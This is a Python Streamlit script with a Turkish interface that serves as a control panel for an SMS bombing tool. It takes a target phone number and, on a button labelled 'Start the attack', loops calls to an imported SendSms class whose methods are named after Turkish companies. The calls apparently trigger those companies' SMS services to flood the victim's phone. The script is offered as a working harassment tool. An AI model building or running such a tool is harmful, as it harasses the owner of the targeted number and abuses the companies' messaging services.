import streamlit as st
import time
from sms import SendSms

st.set_page_config(page_title="SMS SYSTEM", layout="centered")
st.title("SMS OPERASYON PANELİ")

phone = st.text_input("Numara (0 olmadan):")
if st.button("Saldırıyı Başlat"):
    if phone:
        sms = SendSms(phone, "")
        log = st.empty()
        # Döngü
        for i in range(20): # Örnek döngü
            sms.KahveDunyasi()
            sms.Ido()
            sms.Akakce()
            log.info(f"Paket gönderildi: {sms.adet}")
            time.sleep(0.1)
        st.success("İşlem tamamlandı.")
    else:
        st.error("Numara girmelisin!")
